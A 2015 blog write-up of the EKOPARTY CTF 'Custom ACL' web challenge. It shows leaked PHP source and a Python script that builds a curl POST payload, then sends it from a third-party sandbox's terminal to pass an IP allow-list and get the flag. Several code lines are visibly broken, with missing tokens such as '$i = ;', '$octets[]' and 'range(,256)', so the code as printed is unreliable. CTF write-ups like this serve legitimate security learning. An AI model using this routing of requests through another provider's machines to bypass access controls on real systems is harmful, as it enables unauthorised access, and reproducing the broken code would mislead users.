---
id: 221
title: 'EKOPARTY 2015 - Custom ACL - Web 100pt Challenge'
date: 2015-10-24T02:11:00+00:00
author: Kris
layout: post
guid: http://ctf.rip/?p=221
permalink: /ekoparty-2015-custom-acl-web-100p/
post_views_count:
  - "663"
image: /images/2015/10/ca-2.png
categories:
  - Uncategorized
  - Write-Ups
tags:
  - "2015"
---

Cool CTF, finished top 10 so I'm happy with that. Again it began mid week for me but I got sick with a virus so had to stay home anyway. What better to do than to CTF until I feel better?

Great challenge this one but I'm seeing a lot of people were doing strange things to the poor 3rd party involved in their writeups, like nmap scanning etc. None of that was necessary.

Here's the clue:


<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2015/10/ca-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="/images/2015/10/ca-2.png" /></a>
</div>

So another PHP challenge I suppose, we browse on over and then append "s" on the URL to give us:

 * <http://ctfchallenges.ctf.site:10000/ipfilter/admin.phps>

Which coughs up the source code for us:
```
include ('flag.php');

if (isset($_SERVER['REMOTE_ADDR'])) $remote_ip = $_SERVER['REMOTE_ADDR'];
else die('Err');

$octets = explode('.', $remote_ip, 4);

if ($octets[] == '67' 
    && $octets[1] == '222' 
    && $octets[2] == '139' 
    && intval($octets[3]) >= 223 
    && intval($octets[3]) <= 230) {
    if (isset($_POST['admin'])) {
        $admin = $_POST['admin'];
        $is_admin = 1;
        print strlen($admin);
        if (strlen($admin) == 256) {
            for ($i = ; $i < 256; $i++) {
                if ($admin[$i] != chr($i)) $is_admin = ;
            }
        } else $is_admin = ;
        if ($is_admin == 1) echo "Your flag is $flag";
        else  die('Err');
    } else die('Err');
} else die('Err');
?>
```

Ok so the ONLY acceptable IPs are very specifically in the 67.222.139.223 - 67.222.139.230 range. What's special about that? We ask NSLookup to reverse lookup this IP:

```
root@mankrik:~# nslookup 67.222.139.223
Server:  192.168.36.2
Address: 192.168.36.2#53

Non-authoritative answer:
223.139.222.67.in-addr.arpa name = serverIP223.runnable.com.
```

<a href="http://runnable.com/">Runnable.com</a>? Let's check these guys out...

<div class="separator" style="clear: both; text-align: center;">
  <a href="http://1.bp.blogspot.com/-rfibjS91PKY/Virj55Bot_I/AAAAAAAAAQc/m-xCDOqz8HQ/s1600/runnable.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="268" src="/images/2015/10/runnable-2.png" width="640" /></a>
</div>

Ok so online sandboxes we can run code in. Great, but I'm on a deadline here... Oh whats this:

<div class="separator" style="clear: both; text-align: center;">
  <a href="http://3.bp.blogspot.com/-xJ8DTxCy0tE/VirkLQAN5bI/AAAAAAAAAQk/EB_OKVp_-Rs/s1600/runnable2.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="51" src="/images/2015/10/runnable2-2.png" width="320" /></a>
</div>

I don't know, Am I?

I click that link (<a href="http://code.runnable.com/">http://code.runnable.com/</a>) and I'm taken to the meat of their site, a list of code snippets we can run for various reasons. I pick one at random and am greeted with a surprise. Each code snippet gets a kind of web-based terminal to interact with:

<div class="separator" style="clear: both; text-align: center;">
  <a href="http://1.bp.blogspot.com/-VrJwfVh73xg/VirlfJHu9nI/AAAAAAAAAQw/FblDGPd6ooY/s1600/runnable4.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="243" src="/images/2015/10/runnable4-2.png" width="640" /></a>
</div>

The terminal is furnished with useful tools as well, namely "curl":

```
root@runnable:/root# curl                              curl: try 'curl --help' or 'curl --manual' for more information                            
root@runnable:/root#
```                                                    

So i feel we have the vector now, we just need to pass all the other checks. Re-examining the source we need to:

  * Query must be post, fine we can use -d in curl for that
  * Query must contain the admin parameter, fine
  * Admin parameter must be 256 bytes long, fine ok
  * Each byte of the admin parameter value must equal the value of it's index in the string, er ok? Many of those characters wont be printable, we'll need to handle that

So I turn to Python and here's the source I come up with:
```
#!/usr/bin/python

import urllib

payload = ''

for i in range(,256):
 payload += chr(i)

payload = urllib.quote(payload)
payload = 'curl -d "admin=' + payload + '" http://ctfchallenges.ctf.site:10000/ipfilter/admin.php'

print payload
```

Which gives me the following output:
  
```
curl -d "admin=%01%02%03%04%05%06%07%08%09%0A%0B%0C%0D%0E%0F%10%11%12%13%14%15%16%17%18%19%1A%1B%1C%1D%1E%1F%20%21%22%23%24%25%26%27%28%29%2A%2B%2C-./0123456789%3A%3B%3C%3D%3E%3F%40ABCDEFGHIJKLMNOPQRSTUVWXYZ%5B%5C%5D%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7C%7D%7E%7F%80%81%82%83%84%85%86%87%88%89%8A%8B%8C%8D%8E%8F%90%91%92%93%94%95%96%97%98%99%9A%9B%9C%9D%9E%9F%A0%A1%A2%A3%A4%A5%A6%A7%A8%A9%AA%AB%AC%AD%AE%AF%B0%B1%B2%B3%B4%B5%B6%B7%B8%B9%BA%BB%BC%BD%BE%BF%C0%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%D0%D1%D2%D3%D4%D5%D6%D7%D8%D9%DA%DB%DC%DD%DE%DF%E0%E1%E2%E3%E4%E5%E6%E7%E8%E9%EA%EB%EC%ED%EE%EF%F0%F1%F2%F3%F4%F5%F6%F7%F8%F9%FA%FB%FC%FD%FE%FF" http://ctfchallenges.ctf.site:10000/ipfilter/admin.php
```

Which I copy and paste into the Runnable.com web terminal:
```
root@runnable:/root# curl -d "admin=%01%02%03%04%05%06%07%08%09%0A%0B%0C%0D%0E%0F%10%11%12%13%14%15%16%17%18%19%1
A%1B%1C%1D%1E%1F%20%21%22%23%24%25%26%27%28%29%2A%2B%2C-./0123456789%3A%3B%3C%3D%3E%3F%40ABCDEFGHIJKLMNOPQRSTUVWXYZ%
5B%5C%5D%5E_%60abcdefghijklmnopqrstuvwxyz%7B%7C%7D%7E%7F%80%81%82%83%84%85%86%87%88%89%8A%8B%8C%8D%8E%8F%90%91%92%93
%94%95%96%97%98%99%9A%9B%9C%9D%9E%9F%A0%A1%A2%A3%A4%A5%A6%A7%A8%A9%AA%AB%AC%AD%AE%AF%B0%B1%B2%B3%B4%B5%B6%B7%B8%B9%B
A%BB%BC%BD%BE%BF%C0%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%D0%D1%D2%D3%D4%D5%D6%D7%D8%D9%DA%DB%DC%DD%DE%DF%E0%
E1%E2%E3%E4%E5%E6%E7%E8%E9%EA%EB%EC%ED%EE%EF%F0%F1%F2%F3%F4%F5%F6%F7%F8%F9%FA%FB%FC%FD%FE%FF" http://ctfchallenges.c
tf.site:10000/ipfilter/admin.php                                                                                    
256Your flag is EKO{runnable_com_31337_s3rv1c3} 
```

Voila, our flag:

_EKO{runnable_com_31337_s3rv1c3}_